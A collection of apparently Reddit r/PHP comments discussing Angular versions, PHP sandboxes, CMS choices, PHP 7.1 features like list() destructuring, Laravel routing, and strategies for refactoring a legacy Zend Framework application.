This thread just makes me sad :/
what not everyone is using a Mac? Their code must be shit if they aren't using a Mac
Yeah NetBeans will never compete with PHPStorm because of the money involved, it can't match it feature for feature as a free project but as a free alternative not much can match it.
Angular (both v1 and v2) is an application framework that encroaches on your entire project, taking over how you write logic, how you inject dependencies, how you write configuration, much more than just producing interfaces in DOM, which is what React does. And v2 may be different, I'd argue this demonstrates how arbitrary the choices made in v1 were, and if there ever is Angular v3, I'm sure the BC breaks will be plenty again. I don't see any reason why Angular has such a lack of discipline in terms of its scope, other than framework authors who can't trust their users to know what they're doing, so they feel the need to restrict them to a pre-selected architecture every step of the way. The articles about why Angular 2 is a bad idea are yet to be written, I saw the ones for version 1 coming before they existed, and I see nothing categorically different in the Angular 2 approach. If anything, the template system looks even more cumbersome and few lessons were learned while moving away from v1. Here are some experiences using Angular 2: https://medium.com/@lizbennett/why-learning-angular-2-was-excruciating-d50dc28acc8a#.g6g3pn3ud
There was a time not so long ago that I'd live edit a production Magento site, and if (*when*) it broke I'd masterfully hold down ctrl+z hoping I didn't run out of file edit history. At least I was using Notepad++?
For all intents and purposes both private and protected constructors in a singleton class are functionally identical, neither can be seen or accessed from outside the class. The one key difference is when it comes to inheritance. If you would like to extend your singleton you will have to redeclare the constructor in your child class, which is not always practical. :) ^(insert the obligatory anti-pattern / better ways to achieve the desired result rant)
That article was funny, also pretty much is how I feel after having tried to do some Angular 2 this weekend. I get Angular 2 so far, there's just so much stuff to go with it. &gt; And v2 may be different I'm not kidding here when I say it's a completely different framework. It is _literally_ only Angular by name. They didn't just update a few things, they completely rewrote it, and it's completely different to v1. I've got quite a lot of experience with Angular 1 now, and it means nothing with v2. (This is why I made my original comment to you by the way, I do know about Angular, what it is, use cases, etc - it's just the v1 and v2 are worlds apart). The BC breaks just show that it's been rushed. They rushed it to release, and the release candidates should have been betas. Right now, _maybe_ we should be in release candidate stage. But even then, there's _so_ much optimisation to do. File sizes are massive. It's slow to start. Documentation isn't even there yet. It is by no means "final".
If you google for PHP Sandbox you will find some options. Here is the 1st option that should up http://sandbox.onlinephpfunctions.com/
The problem of Angular is conceptual for me. It's a big monolithic framework through which you need to weave your application. And it implements concepts that are doomed to turn into a nightmare in any project with more sophisticated requirements, like two-way binding (vs. explicit event handling).
My personal favourites; * https://repl.it/languages/php * Allows for input via `STDIN` * Supports multiple languages * Share code with a public link * Signup and register to save for later * No on-page noise/ads. Just code and output. * http://eval.in * Allows for input via `STDIN` * Supports multiple languages * Share code with a public link * Allows code forking (from the public link) * No on-page noise/ads. Just code and output. * https://3v4l.org * Test code in all different PHP versions at once * A lot of stats are returned for the script for all PHP versions * Share code with a public link 
Oh. Oh my. Oh *my*.
Agreed. If you're running Apache with `AllowOverride All` (this is important), feel free to grab the `.htaccess` logic from this repository (a ZF2 website): - **Outside** `public` folder: https://github.com/kafoso/dplan/blob/ada2567f6c01e6e5ee3c80deba816f11afcae761/.htaccess (remove lines 8 through 15) - **Inside** `public` folder: https://github.com/kafoso/dplan/blob/ada2567f6c01e6e5ee3c80deba816f11afcae761/public/.htaccess In layman's terms: Only files in the `public` folder are reachable through HTTP(S).
https://3v4l.org/
If you are really _that_ concerned about micro optimizations, I have to ask, why use random_bytes() in first place? uniqid() should be enough to generate a unique ID. It is not a perfectly random value, but since you are not using it for anything related to cryptography, it should be perfectly fine. 
No, this is not possible. (And imho unnecessary. random_bytes() is an IO function, it will dominate.)
If you're having to specify this with htaccess I feel you're still going wrong somewhere. The web server shouldn't be pointed at the directory with your source code to begin with.
I know all of that. I still think it's ridiculous practise to pull image based on entirely different linux distribution with all of its dependencies instead of typing in apt-get install php-cli in nginx Dockerfile. Also, if you do this in development environment, but not in production, it will eventually bite you in the ass, as you do not code for same environment.
FYI, The repository pattern is a structural pattern. Also repository is missing the suggestion of a criteria class for plural matching methods. I would also rename 'persistence' to 'strategy', because the repository does not 'have' to persist objects, but rather only read it or store it into memory. 
&gt; dozens of dependencies Try to avoid at least 50% of your dependencies. `npm` and such are great and easy tools. But you get a shitload of work to do if you can't or won't update your application as the dependencies change.
HTTPS support before it was cool.
- Use adapters and interfaces. Allows you to change an implementation if a library becomes unavailable / unstable. - Think hard if you need a dependency. Prefer stable, tried solutions (ex. MySQL instead of a soup of NoSQL vendors). - Don't "leave it alone" for 2 years. The only code you should leave alone is dead code. Live code needs maintenance.
Yeah it is... fucking nothing. That's 'cause its new. But, never mind, thanks for noticing.
Quit your job. Burn your computer. Move to Iceland. Buy a boat. Become a successful fisherman. 
&gt; It's only a matter of time before they ring it back So you decided to bring it back &gt; why politics doesn't belong in software. So you decided to inject politics into this software development subreddit.
Compare this: $countdown = Closure::fromCallable('printf') -&gt;partial('%s, %s, %s, go!', 'Three'); To: $countdown = printf('%s, %s, %s, go!', 'Three', _, _); I know which one I'd prefer anyway \^_\^ 
In the majority of cases, yes. However, you will inevitably find a situation where having thought about these issues before is helpful in finding a solution.
Yah, that's a good way, but if one of your dependencies has backward incompatible changes, does the fee cover you making any needed modifications, or do you charge extra for that?
October CMS seems to be cool. Its based on Laravel. I personally haven't done anything with it. People on reddit seem to like it. Otherwise id say drupal 8 because it's based on Symfony components. Hope you find something that you like and suits your needs
I don't charge extra, because such costs are already calculated into the monthly fee. Think about it like paying for your cellphone contract. You don't get charged specifically for "we need to upgrade our cells from 3G to 4G" or "we need to put more cells around the place you live". You just pay for the service you get, and the telecom does what it has to do to continue providing you with a competitive service. Instead I charge more for features the client wants enabled/integrated into the site. For example, having e-commerce costs more than having a set of content pages. 
Actually, I opened the thread only in hope to find a question like this, so I can identify and find some comfort. 5 quick tips in a 5min video isn't quite the best way of sharing (at least for this type of... knowledge), when it could've been done with a small list (and *maybe* a couple of screenshots). It's not like you're going to bookmark a youtube video for this in order to come back to it later. But, ok... :) Edit: spelling/typo
Ah, so you charge for features, not time.
Seems like a good start. What kind of features do you plan on implementing next?
I think there's a subtle bug in the iterator pattern examples. More on it here : https://github.com/domnikl/DesignPatternsPHP/issues/232
Regarding `list()`, it has always worked by array element index, *not* by order. `[$a, $b] = [1 =&gt; 2, 0 =&gt; 1];` will set `$a` to `1` and `$b` to `2`. What's new is you can specify the keys, rather than it implicitly using 0, 1, 2 etc.
That was just a test msg to check whether the object is being instantiated, there will be no echo at the end in constructor anyways
How about Jarves.io? https://github.com/jarves/jarves Or bolt.cm https://github.com/bolt/bolt
I'm holding out hope that the next version of [PyroCMS](http://pyrocms.com/) will be on point. It looks good so far, but I can't consider it for production until the documentation is completed and the forums have a bit more action. Previously CodeIgniter based, the 3.* branch runs on Laravel and it looks like the latest update for Pyro already runs on Laravel 5.3. [OctoberCMS](https://octobercms.com/) is targeted towards developers and is not necessarily geared toward being simple for an average content creator by default. However, you can get it there. It's Laravel based as has been mentioned. [BoltCMS](https://bolt.cm/) is Symfony based and gets a lot of love around here. I'd say those those three would be the first ones I'd look at as far as "a CMS that's powered by clean, well structured PHP". It shouldn't take too long to get all three up and running with the default setup and try them out. Then take a look at the code and the database structure to see what's up. If you are using good IDE and development setup, you should be able to browse through the code pretty quickly and see how clean and well structured the code is. 
Nor Joomla.
If you want to experiment with modifying a CMS (via plugins or extensions or whatever), WordPress is actually quite well organized and documented. BoltCMS is a personal favourite of mine for having the more recent code quality, but there are few things more informative or educational than the large WP dev community, and you could do a hell of a lot worse than choosing to use them as a resource. Since you didn't define "well structured", I had to assume you meant "readable". WP code is very readable, while the CMSes based on a whole pile of packages can look like a lot of "magic" unless you also know the packages it's using. On the other hand, if "well structured" means "latest best practices and OOP", then you'd be better off with something like BoltCMS (for simplicity) or Drupal (for complexity). Neither are as readable as WP, but definitely follow recent best-practices more consistently. Be prepared to learn a whole lot of packages as well, though. In BoltCMS, for example, little of the base functionality was actually written by the author - it comes from the Symfony packages. Either way, good luck. FWIW, I've made a lot more money in my career making custom sites in WP than I have with Bolt, Drupal and Joomla combined.
WordPress is a shining paragon of architecture, standards, and overall _correctness_.
The right tool for the job. It really depends on your use case.
You should absolutely worry. If you leave your project alone for a month it will be wickedly out of date, and you will have a hell of a time bringing it up to speed if all your packages don't strictly follow semver, and never ever create bugs. You don't *have* to update your packages every month but you may be missing security updates.
Hi, thanks. :) Most notable on the roadmap of 0.11.0 are: - many-to-one (then the relationships are complete with the already existing one-to-many, many-to-many) - a datatype with a WYSIWYG-HTML-editor (like quill) (as we often need it for simple static pages like imprints) - more customizable behaviour like making the timestamps (created_at, updated_at), soft-deletion and optimistic locking optional For details see https://github.com/philiplb/CRUDlex/projects/3 :)
I was gonna say... I was using that throughout my app for awhile and then discovered it was responsible for a huge amount of performance loss. It was taking something like 15ms per call I think.
I was talking about the PHP ecosystem, not Laravel in particular.
http://www.sonarlint.org/intellij/ Another good suggestion. It can also connect to a SonarQube instance to collect code quality metrics over time.
Well, you quoted Laravel, so... you can understand how that's misleading.
I'm right with you on OSX performance... I've been working around it using http://docker-sync.io/ but that has it's own problems where it'll randomly stop syncing, which is fairly infuriating. So yes, very much looking forward to OSX perf getting fixed.
Nothing says "reliable router" [like having this smack in the middle of your route() method](https://github.com/mohamed4ch/JustRoute/blob/master/example/JustRoute.php#L20): var_dump($pattern); die(); :-)
ORM: ORM from Phalcon Router: Router from Phalcon
https://tyler.io/php-growl/
Remove $, add let as necessary to change value of variables.
You now owe me the time it took me to explain why I laughed out loud to my fiancée 
Another question I had is why do you require the developer to define the data structure in a yml file when the structure is already defined in the database? Wouldn't it be pretty straightforward to just read in the structure from the DB and save the devs the headache of having to manually redeclare everything?
&gt; Class Constant Visibility In 7.1...F'ing finally !
Because it's not unambiguous. A varchar in MySQL could be an URL, an E-Mail or simply a text. And CRUDlex is not restricted to MySQL. There are plans for example to implement a Data class for the open source Parse server which has no types. What I thought about is to implement some kind of bootstrapping yml generator for MySQL which could give you a headstart.
I charge monthly fee for introducing and maintaining a feature. Customers like it because they don't have to pay a large sum up-front. I like it, because I keep copyright on the platform and I can do the same feature faster for the next customer, and I can evolve the platform without needing someone to tell me to do it. Basically it's deciding to offer *your platform* as the service, versus selling *your time* for building entirely custom solutions. Time is limited, it's the only resource we can't make more of. So ideally we shouldn't sell it directly, but smartly, though reusable products and services.
100% this. Not again more confusion..
Besides what's in the post what do you like about it? What other languages do you know that you compare it to? I'm genuinely curious, not trying to start a debate. 
Not /u/Zaskoda, but as an SE with heavy enterprise experience w/ Python, Java, Scala, JS, and others - I love the direction that PHP is heading in. Tightening up the language while improvim performance, all the while the community continues to mature - it's amazing to see. 
You'll likely want to look into the formal concept for this: [event sourcing.](http://martinfowler.com/eaaDev/EventSourcing.html) You will effectively define "events" for all user actions on the site, and then store the data for those events, along with a timestamp, in each row. So yes, a row for every visit. Note however that knowing how long a user spends on a given page is quite a hard problem to solve. You can infer a lot simply subtracting the time between one event's timestamp, and the previous event's timestamp, but it's quite conceivable that a user just went idle for several hours and then came back. Or they could have navigated away and came back. So you'd likely have to record their session ID as well.
PHP has been around a while. What makes the community more mature now than it has in the been in the past? Do you see the language itself benefiting from the community seeing the progress of other languages? 
&gt; WP code is very readable [Like fuck it is.](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php) Let's break this shit down, shall we? 1. Generic, catch-all name - `functions.php`. Totally non-specific, impossible to know what is actually in here or the responsibility of this file. 2. 5534 lines 3. `require( ABSPATH . WPINC . '/option.php' );` Who the fuck knows what kind of global variables and functions this is importing. See a function call somewhere in `functions.php`, and you have no idea if it's defined in`option.php` or `functions.php` itself. Thus to understand all 5534 lines of `functions.php`, you ALSO have to understand `option.php`. 4. https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L89 The readability here speaks for itself. 5. [Oh look, here's some markup and CSS right in the middle of god damn nowhere. Not even in a function. Just flapping in the breeze.](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L2695) 6. [More outstanding readability](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L4508) 7. [Yay, more markup. At least it's in a function this time](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L5171) 8. [Haduken!](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L607-L636) 9. [Globals all over](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L563) 10. [I've seen more readable assembly](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L779) 11. [Want to play guess the function signature?](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L780) 12. [Fuck yeah, error suppression!](https://github.com/WordPress/WordPress/blob/master/wp-includes/functions.php#L1632). Good luck to anyone who uses `xdebug.scream = 1` in their environment. 13. [This function isn't even fucking used anywhere, and it's fucking pointless to begin with](https://github.com/WordPress/WordPress/search?utf8=%E2%9C%93&amp;q=__return_empty_array), and it's double underscore prefixed, which means its super duper private guys! Not allowed to touch! 14. I can't even count how many random responsibilities are in this file. This is truly horrendous even by procedural programming standards. 
`list()` was always one of those strange PHP things (it looks like a function, but it's actually an assignment operator), and I think this is taking it too far. If you had shown me that code before I read the post I'd have no clue what it was doing, I'm not sure how you'd even Google it. I think it's a common problem that does need a solution, but perhaps there is a more readable way?
CMS Airship is great! One of the best piece of PHP code I know of, seriously.
Nice idea and it's a good thing it's only using a single class, but the code is missing comments (and a license). Plus the syntax you chose is quite hard to read. "(i)" for [0-9]+ is not very intuitive, why just not make the route a regexp? That way you could just use \d+, this is a more standard way, it is as short and more descriptive. Same for "(&lt;admin|supervisor&gt;:&lt;\d+&gt;)", why not just allow "(admin|supervisor):(\d+)". The way it is, it just looks like you are try to reinvent regexps.
Delicious unit testing.
It also doesn't especially help that it completely mimics the behavior of `extract()` based on how the names were selected. Although in practice, that's probably how it will typically get used.
I've got PHP 7.0 installed on two of my Linux boxes. When I get some time I think I'll play around with it and see what I find. Thanks again for the input. 
There was one even in PHP 3, http://stackoverflow.com/a/3349841/285587
I'd rather people use this way and be explicit, rather than use extract and potentially pull in everything under the sun.
[removed]
This post is part of a series about PHP 7.1, with a total of 11 articles including changes to types, a look back at PHP 7.0, Closure::createFromCallable, some bc-breaks, ... You can find links to all posts of this series here: [PHP 7.1: introduction and release cycle](https://blog.pascal-martin.fr/post/php71-en-introduction-and-release-cycle.html)
While I don't have a specific use-case where these would come in handy for my usual work with PHP, yeah it would make sense to have those by now...
Completely agree, I just feel that tweaking the names could have made for a clearer example.
Right. As I said: &gt; that accomplishes most of the real world situations your library solves
It **is** wrong in that example! It just tries to show you how [] can be used in as few lines as possible. Any sane person would just assign directly to `$glop` and `$plop`. Here's a nice way this could be used. [$ok, $result] = $jsonDecoder-&gt;decode($input); `null` is also a valid json value, so you usually need to check json_last_error after decoding. Of course, you're free to not use destructuring. It's only eye candy.
Interesting how no one here has mentioned Concrete5.
Really confusing tbh
:D :D :D :D :D :D :D :D
http://i.imgur.com/Br00TCn.gif
You can use this guide http://www.codescafe.com/using-html5-notification-api-to-use-with-php/
This overall sounds bad. If it's over 4 years old it's not a start up any more. That means, the hack and slash phase should be over. So they should have at least started migrating away from their original application. If they haven't it shows that they're not really investing properly in their tech. The entire tech team quit? This should be a massive warning. Normally tech teams don't all leave at once. It's happened twice in my career. Both companies were extremely bad and basically broke the law constantly. Basically if you want to start refactoring your way out of the mess, your first step has to be automated tests. For an old legacy application, I would start with functional tests. Basically make sure a feature works either via a browser or api or whatever. Once you have a decent coverage you can start refactoring and be sure that the application still does what it's meant to do. So you'll need to find the business critical features, find the tool you want to use to test, write some tests. Once you have tests you can either choose to do DDD, or start moving to a new framework application, etc. Overall this all depends on management and if they're willing to let you do all these things. With the best will in the world, if management want you to spend all your time writing features and not spend a week or two building a test suite then you're pretty screwed. I once spent a week writing an automated test for "place order" for an ecommerce, I got some hassle for the amount of time and this was a company that "wanted" to improve their test suite and development practices and this was a critical feature.
why have you reposted this?
i wouldnt rebuild the entire thing if what you mean with "i have to learn by myself" as 'im learning php', you and your employee will both be better off slowly refactoring while improving test coverage, adding tests that cover old and new code if new functionality is needed, etc.. i know this isnt the most fun job but you'll learn the most of it, and you don't risk building a new pile of shit because of taking a too big of a leap. and if you do decide to start over, start a new branch/project alongside the legacy project, and slowly build it up adding small pieces of working code instead of saying "ok guys, throw it away, and ill deliver everything new and refreshed in 6 months"
Hello, The advice is thin on the ground here and answers like 'tough shit' and 'this sounds bad' aren't really a help to anyone. I've recently taken on a legecy system in my new roll which consists of 8 PHP front end e-commernce systems, a really strange UNIX stock management system written in a Language that isn't supported any more and has no documentation, the database is a custom store written in said language and there are a few MySql databases scattered around. The first thing I did was put together an API (version 1) to interface with all the current data sets spread across the multiple databases. One by one I rewrite each part of the applications to interact with the API rather than directly with the data stores. Currently in phase 2 now I'm writing version 2 of the API which is interfacing with a brand new single database and its a case of writing each individual part one by one and switching each part of the current code over to the new version of the API. Now I'm at a point of removing the old code base enterialy from one of the e-commerce stores which is a full rewrite using the V2 API
good stuff, without dependences, thx, I make my nose inside, I've something to do with that ;)
You dot notation is used very frequently in Laravel and other frameworks? I wonder if this might be useful as an expansion of how they use it. Or at the very least it's nice that people are trying to solve the same problems differently.
It said that the post was removed because I was a new user and it was marked as spam. Since I got no answer from the moderators, I reposted. Sorry if it was already visible.
The book that helped me most coping with legacy applications: [Working effectively with legacy code](https://www.amazon.com/gp/product/0131177052/ref=as_li_tl?ie=UTF8&amp;camp=1638&amp;creative=6742&amp;creativeASIN=0131177052&amp;linkCode=as2&amp;tag=zitatequizde-21)
You can of course, but you have to know (or remember) what is an object and what an array: the library gives you a unified interface. Just my opinion.
What the hell.
Keep the application running as it is and create a new one on a development system that has identical functionality. Test and bugfix the shit out of it. Deploy. xxx. Profit.
Laravel's Collection package use it (in the *data_get* method, for example). All the other implementations I found on Packagist work with arrays only. The added bonus of this library is that it should be easy to implement your own access logic (as I did with the getter accessor).
Rewrite is the worst advice
Hi, Find out what part of the application is hurting the most. Then find out what part of the application delivers the most value. Those two are most of the times not aligned. To get a generic overview of the system, you could use something like EventStorming. Your goal is to create value. Four years is hardly a legacy system. It is probably filled with Tech Debt, but that's not the same. Find ways to add value and remember boy scout rule: everything you touch should be somewhat better than that it was before. After identifying the major pain points, try to separate them from the system as a whole i.e. 'Big Ball of Mud'. Hide the implementation behind interfaces/apis or middleware. Add tests against these to make sure you have a stable interface to test against. Now having done this, the groundwork is there to refactor areas that you have to work with daily and that are painful. Mind you, refactoring is not a goal in itself. Your focus should be on creating and adding value. 
Unless you do client side tracking, event sourcing is not a very good model for this. And if you do client side tracking, you're basically rebuilding google analytics. So I would say, just use google analytics
A full rewrite is almost never an option. The business case for that is just too bad. You slowly have to work your way out of it. It's not impossible, but usually requires backing from management and the rest of the team. All your improvements are moot if the rest of the team keeps on piling on. You will be miserable if you have to fight management all the way or you don't get the time to maybe take a bit longer for a feature so you can clean up a little bit while you are in there. Whichever route you take, refactoring the existing code your way out of it or trying to take parts of the application and recreate them in a new application. It's going to be a rocky road. When extracting parts out, you have to make sure that you have all stakeholders on board as early as possible to allow for improving features (which will get management and stakeholders on board) and throwing away stuff that is not needed. Since you are new, that is going to be especially tough as you don't know what works and what doesn't and you probably don't know the domain well enough to ask the right questions. It's tough, but might be worthwhile and can be fun. If you just work on it, get ready for other teams being (rightfully) angry for breaking their workflow because you renamed one lousy field that's not that important, but obviously it's central to their stuff. This is the approach that's more fun, because it's basically green field, but also risky because it causes more overhead (now you have to manage 2 apps that even might interact). Honestly, the best option right now is get the rest of the team on board to write tests (first on a high level and then start going lower). Hassle each other in code reviews, because you want to find excuses. Make tests part of the build, set goals like "no new feature without tests" or when you encounter a bug try to reproduce it in a test case. One major problem I always find with ZF1-projects is that their is no proper dependency inversion. They just use Zend_Registry, globals or what not. That's an easy first target. Move all those calls and pass them as arguments to the constructor. Try to introduce a proper DI-container, be it from ZF2, Symfony, Pimple. Once you have that, you can start wrap the shitty classes to have nicer interfaces, replace usage against those interfaces and then at some point replace the shitty underlying code with something nice that uses that interface. Obviously this will need tests, lots of tests, to make sure you don't break things somewhere else. Regarding tests. Don't start with unit tests, write them for new stuff, but don't try to cover old code in it. You want to throw that old code away anyway, so instead test through the ui. This will stay the same even after your code changes. It won't help you much in finding bugs, but it will be a quick way to spot if your changes break anything somewhere else. It will do. I've seen the weirdest shit happen, with a well tested new class (all unit tests) and the ui tests failed miserably because the original class was abused. Those high level tests will save your ass, so write them and write lots of them. 
&gt; I think it is also worth linking the repo for the official Linux MS driver for PHP. Indeed (added in the blog post comment) &gt; Maybe you can dive more into the installation side? For Fedora / RHEL / CentOS users, a simple "yum install php-sqlsrv" should work ;) I think other distributions should get some packages soon in some repository. 
It's an idea about having ideas, so I'm sure you do, but *idea people* - despite believing otherwise themselves - are completely worthless.
["Code is Poetry" ¯\\\_(ツ)_/¯](https://codex.wordpress.org/WordPress_Philosophy) 
Did they not tell you this before you signed up? Walk away before the guilt sets in. 
I Believe http://cyber-dojo.org/ does what you are looking for. It has many practice exercises and you can start a blank exercise by choosing verbal. IMO doesn't look good but it works.
Thanks, that's why I worte: &gt; But **I can't say**: "ok, stop everything, I will work 6month and give you an awesome app, but please no new features, everything is frozen !" And **I don't think it's a good way** to do. It was irony, I'm sorry that you understood something else. In other word: I will not say that.
Ah you're right about 5. Well, there you go - that's what poorly structured and formatted code will do - make it hard to read and easy to make mistakes with.
It is called a Facade and it is a good software design pattern for hiding those ugly complex APIs. 
Big +1 for wanting to improve your skills in publishing Open Source Software. Always a good idea, and writing a component makes you appreciate good libraries even more. (Everyone should at least once try and implement their own MVC solution :-) ) Thought you might not know Property Access, but be careful: it can be quite expensive (performance) when used excessively.
first of all stop drinking. it takes time to get fat, so it'll take time to lose it. i recommand you read this: http://liamrosen.com/fitness.html, it's a good starting point if you want to get fit. then, get a gym membership, and start practising HARD. there won't be magic, you won't see changes in a day. try to find a good workout (here's mine: http://www.bodybuilding.com/content/what-is-the-best-5-day-workout-split.html). you don't need motivation to move you ass, you need discipline. if you want to see some change, you'll have to work for it.
&gt; Facade [for] hiding those ugly complex APIs. Reference: Xorg. :D
Have you tried Laravel yet? I haven't read your whole post but Laravel is great and fits 99% of use cases.
You may try one of those : - https://github.com/ngduc/Thin-PHP-Framework - http://www.slimframework.com/ - https://fatfreeframework.com/home 
Sorry. That's not what I meant, but maybe I did not explained it well. I thought this was clear with this text, but probably not: &gt; And I don't think it's a good way to do. I confirm my inability to do this, you are right. Cheers.
Leave it there. Inside its box. Put a warning/biohazard sign. Walk away slowly... don't even dare to open it. 
Might be worth adding some benchmarks for each different configuration? Or any pros/cons to using FreeTDS over the MS odbc driver
&gt; You're right, I didn't know about it. It's even a lot better than mine, since it adds the setter part. You can one-up the Symfony version by using an English dictionary and functions like Levenshtein distance to find properties even if you have a typo, or by synonym. Then you can type literally anything and it'll find... something.
&gt; I have to deal with a big legacy application The first step is to have a clear understanding of what "deal" means. I assume it is a web app. Are you responsible for actually deploying it and keeping it running on a day to day basis? How about backups? Security reviews? The point is to make absolutely certain from the get go as to what your responsibilities are. Is there an existing ticket system for tracking problems and feature requests? If so, is it even remotely up to date? Do you have a clear priority of what you are expected to do? Is there a reasonably clear chain of command? Do you know who signs your paychecks? Is there a source code control system? Are all the sources used actually checked in? How about build tool configuration? The biggest problem by far is going to be your attitude. You just joined a company. You are tasked to "deal" with a presumably working application that, for four years now, has provided enough value to the company such that they have hired you to do something with it. And yet you have dismissed the work of the previous tech team out of hand and described it as "dirt" and "shit". Seriously? Are you that much of a super star that within 24 hours you have been able to analyze "weird sh files" and decide they were poorly written? Assume the previous team knew what they were doing. Try to figure out why they did what they did. Maybe they were all screwed up. Or maybe the real problem lies elsewhere.
Problem is rather simple ;) PHP 5 =&gt; FreeTDS PHP 7 =&gt; Microsoft ODBC Driver Sorry, but I don't have enough data to run valuable benchmark, BTW I think most of the time will be spent on the server side, like for most of the DB request.
I've been programming in PHP for a long time and I didn't know that. In my defence, I refuse to use list(), but I should have probably known that in any case. Thanks!
First off, four years old is relatively new. Is it legacy, or just poorly written? Just do the best you can with what you have been given. If your boss is at all competent they will realize the issue is not on your shoulders and it is understood if a task takes triple the time due to inherently bad code. I was in a similar situation where the former team was hired from India for pennies and wrote a proprietary multi-tenant e-commerce platform in like a month and a half. It was terrible. Nearly every time we wanted to add to or customize it I would point out various roadblocks or shortfalls within the code. My boss would shake his head in disgust, but it was always with regret and disdain toward the original developers and not with me and my timelines. Refactor when and where you can, time-permitting. Build refactoring into your estimates. When you have a bit of downtime, dedicate tasks specifically for refactoring. Do it a page or feature at a time. In my current position, we have a monstrous code base where some features and pages use very modern code and practices, and some are just straight up legacy one-off PHP files that haven't been touched since 2008 (including the infamous and massive `func.php`). It's a slow process, but it's work and you're getting paid!
http://i.imgur.com/h7qIiLG.png
Can you provide an example on how you find it more manual?
That's like 40 programming years
That's not an example; that's an explanation. An example would be "In Laravel I create x and then I have to do y to produce z. In yii when I create x then z is automatically generated allowing me to skip y that laravel requires." 
Second answer: Anyway thanks for your answer! I understand now that what I wrote in the main post is like I am a presumptuous developper with no respect for other. You are right to point me this. What I'm doing now is exactly what you says: a full map of what was done (and why). And I think this map will have many errors because I'm not sure what I am doing now.
But it kind of feel like I'm not doing it the Laravel way if I don't use artisan. It made me more sad when I found out that there is no pre-generated CRUD functions :(
Hi thomaf :)
haha : &gt; I was bored by my previous job, I thought when I accepted this work : "ok, I have no idea what I am doing, it's dangerous, I want to try this, it may be fun."
There actually is, if you're taking the time to create your models correctly. You'll have `save()` for creation and updating, `find()`, `first()`, `all()` and `get()` for retrieval, and `destroy()` for deletion, so long as your model `extends Model`. EDIT: A lot of people, including myself in the beginning, don't take the time to learn ORM and go straight to the query builder, because we are used to thinking through the desired result in SQL. But Eloquent is there and ready to do a lot of heavy lifting, once I got the hang of it I was really impressed. I will occasionally rough in some desired operation with the query builder, but almost all of them I've later been able to refactor using an Eloquent method.
[Action-Domain-Responder](https://github.com/pmjones/adr)
For automated route generation, there's [laravelcollective/annotations](https://laravelcollective.com/docs/5.3/annotations) - removed from the official laravel repo, and now maintained by the community - let you use Annotations to define routes from your controllers.
You can turn on controllers scan: protected $scanControllers = true; or scan everything: protected $scanEverything = true;
CI's automatic routing is godawful and you should not compare it to anything written for modern frameworks, so yes, you're missing the point. Having to define your routes is ALWAYS the way to go, if nothing else but from a security perspective.
That doesn't sound like a crazy legacy situation; it sounds like normal software engineering work. Learn how it's put together and why without dismissing it out of hand; there are always reasons for something to be the way it is, and you need to know if those reasons are still valid. Implement bug fixes and new features, but balance that with paying off technical debt. You're going to need to do some project management here to handle priorities. This will be an excellent opportunity for you to learn what things you should and should not do to make *your* software maintainable for the long term.
Yeah, that's what I've been doing recently. Inherited an old zend app that was done poorly. They implemented their own ORM doing all kinds of nonsense magic, over-engineered the wrong things, and the tech is just old. First thing I did was work on the server architecture and transition to chef, and then started on refactoring pieces. A few months later I've been able to get rid of entire pieces of hardware as a result of bits of refactoring. It seems like a long road ahead, but from my experience once you've refactored and simplified some of the big problem points you'll have you're end goal in sight...even if it's transitioning to another framework.
I went through this. It's important to refactor as you go, focusing most heavily on areas that you have to touch frequently. The steps listed below aren't meant to be done rigidly, but rather iteratively. It'll take you several passes before the code is something you can feel proud of. It'll probably take years to fully clean up the mess, depending on how bad it is. 1. Get it into source control, if it somehow isn't already. 2. Determine what you'd like the code to look like after you're done. My target was to use stand-alone libraries to get the code into a form that mimics how a modern framework looks, so I could theoretically cut over to such a framework after the clean-up is done. Even if that never happens, you'll have a familiar structure for yourself and any other devs who have to deal with the code. 3. Start cleaning up the worst of the junk with low-level refactorings. This is an on-going process that you'll continue during later steps, but it's critical to do some of this before you can do any of the later steps. 1. Bring some sanity to the code by refactoring to PSR code-style. The goal is mainly just to get it to the point that you can read the mess at a basic level with things like proper indentation, use of braces, etc. Low-level stuff. 2. Clean out commented code, dead code, files that are flat-out unused, etc. This clears out the junk so you can see what matters in the code that remains. I had found a ton of calls to web services whose results were never used this way. Lots of code died for me while I did this. 4. Add Composer and set up a PSR-4 folder for any new code that you create, even if you're not yet pulling in any libraries. From now on, all new class and function files are auto-loaded. 5. Start extracting things into functions and objects. You'll probably find lots of instances where there's copy/pasted/modified code. Pull that junk out. Your extracted code need not be the final form of the code. You're just trying to DRY things out a bit, so you can start to discern higher-level patterns in the code. Once you know how things really should look, you can more easily refactor your extracted code than the mess that it cleaned up. 6. Pull in some routing library and start moving things into controllers. This is also a good time to introduce a templating library, like Twig. When you pull the logic for a page into a controller, it's the ideal time to pull the HTML into a proper template. 1. If your PHP and HTML are hopelessly intertwined, make a big, obvious comment that marks your line in the sand between business and presentation logic and stick it at the top of the file. Start to shift what logic you can above that line while leaving HTML below it. You'll eventually have a nice clean marker between what goes in the controller (above the line) and the template (below the line.) 7. Find an ORM that you like and start standardizing database accesses to specific tables into domain objects. I'm a big fan of Eloquent, but it doesn't come out of Laravel very well. Find one that's meant to truly stand alone and use that. If your legacy code is like most, your database schema will be as much of a mess as the code. This makes it hard to map named domain objects to the tables. 1. Map the ones that you can. 2. Don't sweat about the ones that you can't. You may be able to revisit these later as other things take shape. 3. For things where it's close, it is possible to refactor the database schema. Check out "Refactoring Databases" by Ambler and Sadalage for some good patterns to slowly walk a schema from one layout to another, including ways of using triggers to create transitional states for the schema if you need to support a transition period to move code from the old to the new schema. Triggers are a messy affair, so you'll want to use them only sparingly and keep the transition periods as short as possible. You generally need to have a solid understanding of what is used where, and why, before you can start to really do this, so it's generally something to do near the end. Remember to just always leave things better than you found them each time you touch an area of the code base and you'll always get closer to clean code. When writing new code, make it as clean as possible given your environment.
I have also heard good things about this book.
That's only 102 away! (101 in parts of the eastern hemisphere.)
First thing you need to do is to find out what the business wants you to do, and for you to communicate a) how costly in terms if time and resource that would be and b) an alternative that you feel would be better for the company in the medium to long term. Then you can start making engineering decisions.
Is it easy to store JS variables from the page into Piwik/GA?
